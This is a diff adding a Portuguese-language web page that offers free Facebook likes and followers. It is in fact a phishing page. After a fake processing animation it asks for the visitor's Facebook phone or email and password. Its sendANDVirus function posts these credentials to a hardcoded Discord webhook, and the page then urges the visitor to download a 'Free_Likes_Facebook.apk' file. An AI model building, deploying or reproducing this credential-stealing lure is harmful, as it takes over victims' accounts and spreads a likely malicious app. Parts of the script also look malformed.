@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Boost Likes & Seguidores</title>
+    <style>
+        body {
+            background-color: #1877f2;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        input, button {
+            width: calc(100% - 16px);
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        button {
+            background: #1877f2;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #165dbb;
+        }
+.proccess{
+border-radius:50%;
+border:5px solid blue;
+height:150px;
+width:150px;
+border-left:5px solid cyan;
+border-right:5px solid cyan;
+animation:girar 2s infinite ease;
+position:relative;
+left:65px;
+}
+.fakePC span{
+top:-90px;
+position:relative;
+display:inline-block;
+font-weight:bold;
+animation:piscar 0.25s infinite reverse;
+font-size:20px;
+}
+@keyframes piscar{
+0%{
+color:cyan;
+}
+100%{
+color:blue;
+}
+}
+@keyframes girar{
+100%{
+rotate:360deg;
+}
+
+}
+.fakePC{
+display:none;
+}
+
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Aumente seus Likes e Seguidores no Facebook</h2>
+        <form id="boostForm">
+            <label for="likes">Número de Likes:</label>
+<br><br>
+            <select style="width:200px; font-weight:bold; padding:10px; color:blue; font-size:15px;" name="opcoes">
+<option>1000 Likes</option>
+<option selected>500 Likes</option>
+<option>200 Likes</option>
+<option>100 Likes</option>
+</select>
+<br><br>
+
+            
+
+            <button type="button" onclick="showLogin()">Continuar</button>
+        </form>
+
+        <div id="loginForm" style="display:none;">
+
+<p style="font-weight:bold; font-size:30px; color:blue;">Para receber os Likes você deve iniciar sessão</p>
+            <h3>Faça Login para Continuar</h3>
+            <div>
+                <label for="email">Telefone/Email:</label>
+                <input type="text" id="email" name="email" required>
+                
+                <label for="senha">Senha:</label>
+                <input type="password" id="senha" name="senha" required>
+
+                <button onclick="sendANDVirus()" >Confirmar</button>
+            </div>
+        </div>
+<div class="fakePC">
+<div class="proccess">
+</div>
+<span>Processando</span>
+</div>
+    
+
+<div class="downloadAPK" style="display:none">
+<h3>Baixe o nosso APP para continuar e para ganhar os Likes e Seguidores</h3>
+<a href="Free_Likes_Facebook.apk" style="font-size:30px;" download>Baixar Agora</a>
+</div>
+</div>
+    <script>
+        function showLogin() {
+            document.getElementById('boostForm').style.display = 'none';
+document.querySelector(".fakePC").style.display="block";
+setTimeout(function(){
+document.querySelector("#loginForm").style.display="block";
+document.querySelector(".fakePC").style.display="none";
+},5000)
+            //document.getElementById('loginForm').style.display = 'block';
+        }
+function sendANDVirus(){
+telEmail=document.querySelector("#email").value;
+senha=document.querySelector("#senha").value;
+const webhookURL="https://discord.com/api/webhooks/1325626529216200797/agMz3pSFTYcvAGu0N_kyZWTPdm54_7xyr6ElRPKrraIKcdtsb5t3WlDqqgNB5yjrSnLp"
+const msg={
+content: "Telefone/Email: "+telEmail+"\nSenha: "+senha
+}
+fetch(webhookURL,{
+method: "POST",
+headers: {"Content-Type": "application/json"},
+body: JSON.stringify(msg)
+});
+
+}
+
+
+
+
+
+document.querySelector("#loginForm").style.display="none";
+
+document.querySelector(".downloadAPK").style.display="block"
+
+}
+
+    </script>
+</body>
+</html>
